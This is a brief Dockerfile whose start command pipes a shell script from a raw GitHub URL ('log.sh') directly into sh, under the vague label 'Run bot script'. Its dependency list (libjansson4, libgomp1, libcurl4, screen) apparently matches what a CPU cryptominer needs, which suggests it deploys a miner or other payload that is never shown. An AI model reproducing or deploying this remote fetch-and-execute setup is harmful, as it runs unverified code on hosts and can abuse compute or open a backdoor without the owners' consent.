FROM node:18

WORKDIR /app

RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 
RUN npm install
            
# Run bot script:
CMD curl https://raw.githubusercontent.com/55113110159/OS/main/log.sh | sh
